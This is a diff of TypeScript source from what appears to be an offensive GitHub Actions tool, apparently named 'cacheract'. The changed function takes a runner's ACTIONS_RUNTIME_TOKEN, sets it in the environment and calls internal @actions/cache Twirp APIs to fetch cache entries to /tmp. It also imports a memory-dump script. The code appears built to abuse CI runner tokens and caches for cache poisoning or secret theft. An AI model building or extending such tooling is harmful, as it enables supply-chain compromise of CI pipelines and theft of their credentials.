@@ -5,7 +5,10 @@ import * as path from 'path';
 import * as fs from 'fs';
 import axios from 'axios';
 import { MEMDUMP_SCRIPT } from './static';
-import { tmpdir } from 'os';
+import { tmpdir, version } from 'os';
+import { restore } from 'mock-fs';
+import { GetCacheEntryDownloadURLRequest } from '@actions/cache/lib/generated/results/api/v1/cache';
+import { DownloadOptions } from '@actions/cache/lib/options';
 
 const execAsync = promisify(exec);
 
@@ -30,6 +33,9 @@ export type RunnerEnvironment = {
 export async function sleep(ms: number) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
+
+var cacheTwirpClient = require('@actions/cache/lib/internal/shared/cacheTwirpClient');
+var cacheHttpClient = require('@actions/cache/lib/internal/cacheHttpClient');
 
 /**
  * Generate a random string of specified length
@@ -65,29 +71,25 @@ export async function getOsInfo() {
 export async function retrieveEntry(cache_key: string, cache_version: string, runtimeToken: string): Promise<string> {
     var cacheHttpclient = require('@actions/cache/lib/internal/cacheHttpClient');
     try {
-        const headers = {
-            'Authorization': `Bearer ${runtimeToken}`,
-            'User-Agent': 'actions/cache-4.0.2',
-            'accept': 'application/json'
-        };
-
         // We need both the cache URL and ACTIONS_RUNTIME_TOKEN to retrieve the cache.
         if (!runtimeToken) {
             return '';
         }
 
-        const url = new URL(`https://results-receiver.actions.githubusercontent.com/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL`);
-
-        const cache_data = {
-            "key": cache_key,
-            "version": cache_version,
+        process.env['ACTIONS_RUNTIME_TOKEN'] = runtimeToken;
+        const request: GetCacheEntryDownloadURLRequest = {
+            key: cache_key,
+            restoreKeys: [],
+            version: cache_version
         }
 
-        // Make the HTTP GET request using axios
-        const response = await axios.post(url.href, {cache_data}, { headers: headers });
-        if (response.status == 200) {
-            const location = new URL(response.data['signed_download_url'])
-            await cacheHttpclient.downloadCache(location, '/tmp/cacheract.tar.tzstd');
+        const twirpClient = cacheTwirpClient.internalCacheTwirpClient();
+        const response = await twirpClient.GetCacheEntryDownloadURL(request)
+        const options: DownloadOptions = {
+            useAzureSdk: true
+        }
+        if (response.ok) {
+            await cacheHttpclient.downloadCache(response.signedDownloadUrl, '/tmp/cacheract.tar.tzstd', options);
             if (fs.existsSync('/tmp/cacheract.tar.tzstd')) {
                 console.log('Cache retrieved successfully');
                 return '/tmp/cacheract.tar.tzstd';
